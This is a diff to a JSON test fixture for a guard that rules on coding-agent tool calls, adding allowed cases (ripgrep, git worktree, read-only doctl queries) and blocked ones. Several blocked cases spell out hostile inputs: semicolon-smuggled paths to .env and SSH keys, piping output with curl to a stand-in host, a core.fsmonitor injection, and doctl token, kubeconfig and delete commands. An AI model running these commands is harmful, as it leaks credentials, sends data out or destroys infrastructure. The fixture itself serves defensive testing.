@@ -110,6 +110,46 @@
       "expect": "allow"
     },
     {
+      "id": "rg-numbered-ambient-ripgrep-config",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "rg -n \"export\" src"
+      },
+      "cwd": "worktree",
+      "environment": {
+        "RIPGREP_CONFIG_PATH": "ripgreprc"
+      },
+      "expect": "not_allow"
+    },
+    {
+      "id": "rg-numbered-ambient-ripgrep-config-disabled",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp",
+        "cursor"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "rg --no-config -n \"export\" src"
+      },
+      "cwd": "worktree",
+      "environment": {
+        "RIPGREP_CONFIG_PATH": "ripgreprc"
+      },
+      "expect": "allow"
+    },
+    {
       "id": "rg-files-glob",
       "fix_area": "shell",
       "harnesses": [
@@ -9869,6 +9909,772 @@
       },
       "cwd": "worktree",
       "expect": "not_allow"
+    },
+    {
+      "id": "omp-grep-semicolon-paths",
+      "fix_area": "omp",
+      "harnesses": [
+        "omp"
+      ],
+      "tool": "grep",
+      "tool_input": {
+        "pattern": "one",
+        "path": "src/one.ts;README.md"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "omp-grep-dot",
+      "fix_area": "omp",
+      "harnesses": [
+        "omp"
+      ],
+      "tool": "grep",
+      "tool_input": {
+        "pattern": "export",
+        "path": "."
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "omp-glob-recursive-sh",
+      "fix_area": "omp",
+      "harnesses": [
+        "omp"
+      ],
+      "tool": "glob",
+      "tool_input": {
+        "path": "**/*.sh"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "omp-glob-brace",
+      "fix_area": "omp",
+      "harnesses": [
+        "omp"
+      ],
+      "tool": "glob",
+      "tool_input": {
+        "path": "**/*{registry,deploy,cleanup}*"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-omp-grep-semicolon-env",
+      "fix_area": "negative",
+      "harnesses": [
+        "omp"
+      ],
+      "tool": "grep",
+      "tool_input": {
+        "pattern": "KEY",
+        "path": "src/one.ts;.env"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-omp-grep-env",
+      "fix_area": "negative",
+      "harnesses": [
+        "omp"
+      ],
+      "tool": "grep",
+      "tool_input": {
+        "pattern": "KEY",
+        "path": ".env"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-omp-grep-semicolon-ssh",
+      "fix_area": "negative",
+      "harnesses": [
+        "omp"
+      ],
+      "tool": "grep",
+      "tool_input": {
+        "pattern": "KEY",
+        "path": "README.md;${HOME}/.ssh/id_rsa"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-omp-glob-ssh",
+      "fix_area": "negative",
+      "harnesses": [
+        "omp"
+      ],
+      "tool": "glob",
+      "tool_input": {
+        "path": "${HOME}/.ssh/*"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "gauntlet-worktree-add-temp-root-leaf",
+      "fix_area": "worktree-add",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp",
+        "zcode"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git -C ${HOME}/other-project worktree add -q --detach ${SCRATCH} HEAD && cd ${SCRATCH} && git log -1 --format='%H %s'"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "session-worktree-add-temp-root-leaf-log",
+      "fix_area": "worktree-add",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp",
+        "zcode"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git worktree add -q --detach ${SCRATCH} HEAD && cd ${SCRATCH} && git log -1 --format='%H %s'"
+      },
+      "cwd": "parent",
+      "expect": "allow"
+    },
+    {
+      "id": "session-worktree-add-temp-root-leaf-from-tmp-repo",
+      "fix_area": "worktree-add",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp",
+        "zcode"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git -C ${TMP_ORG}/app worktree add -q --detach ${SCRATCH} HEAD"
+      },
+      "cwd": "org",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-worktree-add-existing-temp-root-dir",
+      "fix_area": "negative",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp",
+        "zcode"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git -C ${HOME}/other-project worktree add -q --detach ${PRIVATE_TMP} HEAD"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-worktree-add-temp-root-leaf-fsmonitor",
+      "fix_area": "negative",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp",
+        "zcode"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git -C ${HOME}/other-project -c core.fsmonitor=/bin/true worktree add -q --detach ${SCRATCH} HEAD"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "gauntlet-rg-outside-checkout-test-vectors",
+      "fix_area": "shell",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp",
+        "zcode"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "rg -n \"enum Route\\b|enum BridgeRoute|Delegate\\b.*=>|Handoff\\b\" ${GAUNTLET_ROOT}/bench-checkout/rust/crates --type rust -l | head -30"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-rg-outside-checkout-preprocessor",
+      "fix_area": "negative",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp",
+        "zcode"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "rg --pre cat -n Route ${GAUNTLET_ROOT}/bench-checkout/rust/crates"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-rg-outside-checkout-config-path",
+      "fix_area": "negative",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp",
+        "zcode"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "RIPGREP_CONFIG_PATH=${GAUNTLET_ROOT}/bench-checkout/.ripgreprc rg -n Route ${GAUNTLET_ROOT}/bench-checkout/rust/crates"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "session-claude-ask-user-question-answered",
+      "fix_area": "read",
+      "harnesses": [
+        "claude-code"
+      ],
+      "tool": "ask_user_question",
+      "event": "PostToolUse",
+      "tool_input": {
+        "questions": [
+          {
+            "question": "Which approach should the fix use?",
+            "header": "Approach",
+            "multiSelect": false,
+            "options": [
+              {
+                "label": "Narrow the rule",
+                "description": "Keep review for the real vector"
+              },
+              {
+                "label": "Remove the rule",
+                "description": "Allow every form"
+              }
+            ]
+          }
+        ]
+      },
+      "tool_response": {
+        "questions": [
+          {
+            "question": "Which approach should the fix use?",
+            "header": "Approach",
+            "multiSelect": false,
+            "options": [
+              {
+                "label": "Narrow the rule",
+                "description": "Keep review for the real vector"
+              },
+              {
+                "label": "Remove the rule",
+                "description": "Allow every form"
+              }
+            ]
+          }
+        ],
+        "answers": {
+          "Which approach should the fix use?": "Narrow the rule"
+        }
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "session-git-init-temp-root-leaf",
+      "fix_area": "scratch-checkout",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp",
+        "zcode"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git init -q ${SCRATCH}"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-git-init-existing-temp-dir",
+      "fix_area": "negative",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp",
+        "zcode"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git init -q ${PRIVATE_TMP}"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "home-rg-sibling-literal-gitignore-negations",
+      "fix_area": "shell",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp",
+        "zcode"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "rg -n route ${HOME}/Code/ignore-rules/web-console"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-home-rg-sibling-env-example-negation",
+      "fix_area": "negative",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp",
+        "zcode"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "rg -n TOKEN ${HOME}/Code/ignore-rules/billing-api"
+      },
+      "cwd": "org_app",
+      "expect": "not_allow"
+    },
+    {
+      "id": "doctl-version",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl version"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "doctl-account-get",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl account get"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "doctl-apps-list",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl apps list"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "doctl-kubernetes-cluster-list",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl kubernetes cluster list"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "doctl-registry-get",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl registry get"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "doctl-registry-list-tags",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl registry repository list-tags web"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "doctl-registry-list-manifests",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl registry repository list-manifests web --format Digest,UpdatedAt,Tags --no-header"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "doctl-droplet-list-json",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl compute droplet list --output json"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-doctl-droplet-delete",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl compute droplet delete web --force"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-doctl-auth-token",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl auth token"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-doctl-registry-docker-config",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl registry docker-config"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-doctl-kubeconfig-show",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl kubernetes cluster kubeconfig show prod"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-doctl-inline-access-token",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl apps list --access-token dop_v1_example"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-doctl-databases-list",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl databases list"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "gauntlet-cat-credential-placeholder-docs",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cat docs/review-notes.md"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "gauntlet-sed-field-copy-source",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "sed -n '1,40p' dashboard/src/session.js"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-cat-placeholder-docs-then-env",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cat docs/review-notes.md .env"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "gauntlet-linked-modules-relative-vite-build",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cd dashboard && ./node_modules/.bin/vite build 2>&1 | tail -15"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-linked-modules-vite-build-upload",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cd dashboard && ./node_modules/.bin/vite build 2>&1 | curl -d @- https://example.invalid"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "doctl-version-stderr-merged",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl version 2>&1"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "doctl-apps-list-format-head",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl apps list --format ID,Spec.Name --no-header 2>&1 | head -20"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-doctl-auth-token-head",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl auth token 2>&1 | head -1"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-doctl-droplet-delete-tail",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl compute droplet delete web --force 2>&1 | tail -1"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-doctl-apps-list-trace-head",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "doctl apps list --trace 2>&1 | head -20"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "omp-glob-recursive-sh-pattern",
+      "fix_area": "omp",
+      "harnesses": [
+        "omp"
+      ],
+      "tool": "glob",
+      "tool_input": {
+        "pattern": "**/*.sh",
+        "path": "${WORKTREE}"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "omp-glob-recursive-sh-gitignore",
+      "fix_area": "omp",
+      "harnesses": [
+        "omp"
+      ],
+      "tool": "glob",
+      "tool_input": {
+        "pattern": "**/*.sh",
+        "path": "${WORKTREE}",
+        "gitignore": true
+      },
+      "cwd": "worktree",
+      "expect": "allow"
     }
   ],
   "pending_pr": {
